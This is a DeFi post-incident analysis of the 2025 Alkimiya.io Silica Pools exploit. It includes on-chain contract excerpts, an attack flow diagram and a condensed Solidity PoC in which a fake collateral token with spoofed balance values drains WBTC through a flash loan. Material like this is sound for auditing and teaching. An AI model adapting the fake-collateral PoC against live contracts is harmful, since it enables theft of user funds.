# Alkimiya.io — Silica Pool Manipulation via Morpho Flash Loan Analysis

| Field | Details |
|------|------|
| **Date** | 2025-03-18 |
| **Protocol** | Alkimiya.io (Silica Pools) |
| **Chain** | Ethereum |
| **Loss** | ~95,500 USD (1.14015390 WBTC) |
| **Attacker** | [0xF6ffBa5cbF285824000daC0B9431032169672B6e](https://etherscan.io/address/0xF6ffBa5cbF285824000daC0B9431032169672B6e) |
| **Attack Tx** | [0x9b9a6dd0...](https://etherscan.io/tx/0x9b9a6dd05526a8a4b40e5e1a74a25df6ecccae6ee7bf045911ad89a1dd3f0814) |
| **Vulnerable Contract** | [0xf3f84ce038442ae4c4dcb6a8ca8bacd7f28c9bde](https://etherscan.io/address/0xf3f84ce038442ae4c4dcb6a8ca8bacd7f28c9bde) |
| **Root Cause** | `collateralizedMint` in silicaPools allows collateral manipulation via attacker-controlled tokens |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-03/Alkimiya_io_exp.sol) |

---

## 1. Vulnerability Overview

Alkimiya.io's Silica Pools is a DeFi protocol that tokenizes and trades hashrate. The attacker borrowed WBTC via a Morpho flash loan, then exploited the `collateralizedMint` function by supplying a fake token contract — controlled by the attacker — as collateral. The attacker contract implemented the ERC1155 receiver callback and a custom token interface to bypass the collateral validation logic.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable collateralizedMint: no validation of collateral token trustworthiness
function collateralizedMint(
    address collateralToken,  // ❌ Allows attacker-controlled address
    uint256 amount,
    // ...
) external {
    // Calls decimals(), balance(), shares() on the collateral token
    // ❌ These values are returned by the attacker-controlled contract
    uint256 collateralAmount = IToken(collateralToken).balance();
    uint256 shares = IToken(collateralToken).shares();

    // ❌ Mints WBTC without any validation
    IWBTC(WBTC).transfer(msg.sender, amount);
}

// ✅ Correct code: whitelist-based collateral validation
function collateralizedMint(
    address collateralToken,
    uint256 amount,
    // ...
) external {
    require(approvedCollaterals[collateralToken], "Not approved collateral"); // ✅
    // Use only verified on-chain data
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: contracts/SilicaPools.sol
function unpause() external onlyOwner {
        paused = false;
        emit SilicaPools__UnpauseProtocol();
    }

// ... (lines 148-153 omitted) ...

    function startPools(PoolParams[] calldata poolParams) external {
        for (uint256 i = 0; i < poolParams.length; ++i) {
            startPool(poolParams[i]);
        }
    }

// ... (lines 159-234 omitted) ...

    function poolState(bytes32 poolHash) external view returns (PoolState memory) {
        return sPoolState[poolHash];
    }

// ... (lines 238-239 omitted) ...

    function startBounty(PoolParams[] calldata poolParams) external view returns (uint256[] memory) {
        uint256[] memory bounties = new uint256[](poolParams.length);
        for (uint256 i = 0; i < poolParams.length; ++i) {
            bounties[i] = _startBounty(poolParams[i]);
        }
        return bounties;
    }

// ... (lines 247-248 omitted) ...

    function endBounty(PoolParams[] calldata poolParams) external view returns (uint256[] memory) {
        uint256[] memory bounties = new uint256[](poolParams.length);
        for (uint256 i = 0; i < poolParams.length; ++i) {
            bounties[i] = _endBounty(poolParams[i]);
        }
        return bounties;
    }

// ... (lines 256-257 omitted) ...

    function viewRedeemShort(PoolParams calldata shortParams, address account)
        external
        view
        returns (uint256 expectedPayout)
    {
        bytes32 poolHash = hashPool(shortParams);
        PoolState storage sState = sPoolState[poolHash];

        // Pool not yet ended
        if (sState.actualEndTimestamp == 0) {
            revert SilicaPools__PoolNotEnded(poolHash);
        }

        uint256 shortTokenId = toShortTokenId(poolHash);
        uint256 shortSharesBalance = balanceOf(account, shortTokenId);

        // Short payouts pay ((cap - balanceChangePerShare) * collateralMinted) / ((cap - floor)) * shortSharesBalance) / totalSharesMinted)
        expectedPayout = PoolMaths.shortPayout(shortParams, sState, shortSharesBalance);
    }

// ... (lines 277-441 omitted) ...

    function endPool(PoolParams calldata poolParams) public {
        bytes32 poolHash = hashPool(poolParams);
        PoolState storage sState = sPoolState[poolHash];

        ISilicaIndex index = ISilicaIndex(poolParams.index);

        if (sState.actualEndTimestamp != 0) {
            revert SilicaPools__PoolAlreadyEnded(poolHash);
        }
        if (block.timestamp < poolParams.targetEndTimestamp) {
            revert SilicaPools__TooEarlyToEnd(block.timestamp, poolParams.targetEndTimestamp);
        }
        uint256 indexBalanceAtEnd = index.balance();
        sState.balanceChangePerShare = uint128(
            PoolMaths.balanceChangePerShare(
                indexBalanceAtEnd,
                sState.indexInitialBalance,
                sState.indexShares,
                index.decimals(),
                poolParams.floor,
                poolParams.cap
            )
        );

        sState.actualEndTimestamp = uint48(block.timestamp);

        uint256 endBountyAmount = _endBounty(poolParams);
        sState.collateralMinted -= uint128(endBountyAmount);

        SafeERC20.safeTransfer(IERC20(poolParams.payoutToken), msg.sender, endBountyAmount);
        emit SilicaPools__BountyPaid(poolHash, endBountyAmount, msg.sender);

        emit SilicaPools__PoolEnded(poolHash, indexBalanceAtEnd, sState.balanceChangePerShare);
    }

// ... (lines 476-660 omitted) ...

    function redeemLong(PoolParams calldata longParams) public {
        bytes32 poolHash = hashPool(longParams);
        PoolState storage sState = sPoolState[poolHash];

        if (sState.actualEndTimestamp == 0) {
            revert SilicaPools__PoolNotEnded(poolHash);
        }

        uint256 longTokenId = toLongTokenId(poolHash);
        uint256 longSharesBalance = balanceOf(msg.sender, longTokenId);
        // Long payouts pay ((balanceChangePerShare - floor) * collateralMinted) / ((cap - floor) * userLongBalance) / totalSharesMinted)
        uint256 payout = PoolMaths.longPayout(longParams, sState, longSharesBalance);

        _burn(msg.sender, longTokenId, longSharesBalance);

        SafeERC20.safeTransfer(IERC20(longParams.payoutToken), msg.sender, payout);

        emit SilicaPools__SharesRedeemed(
            poolHash, msg.sender, longParams.payoutToken, longTokenId, longSharesBalance, payout
        );
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► Morpho Flash Loan (borrow WBTC)
  │
  ├─[2]─► Deploy fake collateral token contract
  │         ├─► decimals() → returns manipulated value
  │         ├─► balance() → returns manipulated value
  │         ├─► shares() → returns manipulated value
  │         └─► transferFrom() → always returns success
  │
  ├─[3]─► Call silicaPools.startPool() (start pool with fake token)
  │
  ├─[4]─► Call silicaPools.collateralizedMint()
  │         └─► Extract real WBTC using fake collateral
  │
  ├─[5]─► Call silicaPools.endPool()
  │
  ├─[6]─► Repay Morpho flash loan
  │
  └─[7]─► Net profit: 1.14 WBTC (~95,500 USD)
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract AttackerC {
    uint256 id;

    function attack() external {
        // [1] Borrow WBTC via Morpho flash loan
        IFS(morpho).flashLoan(WBTC, FLASH_AMOUNT, "");
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata data) external {
        // [2] Create Silica pool (using attacker contract itself as collateral token)
        IFS(silicaPools).startPool(
            IFS.PoolParams({
                collateralToken: address(this), // ❌ attacker contract
                // ...
            })
        );

        // [3] Extract WBTC via collateralizedMint
        IFS(silicaPools).collateralizedMint(
            id,
            address(this),
            FLASH_AMOUNT,
            0
        );

        // [4] End pool and clean up
        IFS(silicaPools).endPool(...);

        // [5] Repay flash loan
        IERC20(WBTC).approve(morpho, assets);
    }

    // Attacker contract implements collateral token interface
    function decimals() external returns (uint256) { return 8; }
    function transferFrom(address, address, uint256) external returns (bool) {
        return true; // ❌ always returns success
    }
    function shares() external returns (uint256) { return LARGE_AMOUNT; }
    function balance() external returns (uint256) { return LARGE_AMOUNT; }

    // ERC1155 receive handler
    function onERC1155Received(...) external returns (bytes4) {
        return this.onERC1155Received.selector;
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Missing Input Validation / Untrusted External Call |
| **Attack Technique** | Flash Loan + Fake Collateral Token |
| **DASP Category** | Access Control / Untrusted Inputs |
| **CWE** | CWE-20: Improper Input Validation |
| **Severity** | Critical |
| **Attack Complexity** | High |

## 6. Remediation Recommendations

1. **Whitelist Validation**: Apply a whitelist approach that only permits pre-approved tokens as collateral.
2. **Distrust External Token Data**: Do not trust return values from collateral token contracts; perform independent on-chain verification instead.
3. **Flash Loan Defense**: Detect and block pools that are started and ended within the same transaction.
4. **Audit**: All protocols with a collateral system should focus audits on trust boundaries with external contracts.

## 7. Lessons Learned

- **External Contract Trust Boundaries**: Data returned from contract addresses supplied by users must never be trusted.
- **Importance of Collateral Validation**: Collateral-based systems must strictly restrict the types of accepted collateral.
- **Role of MEV Bots**: The original attacker's (0xF6ff...) transaction was front-run by a MEV bot (Yoink), which captured the profit instead.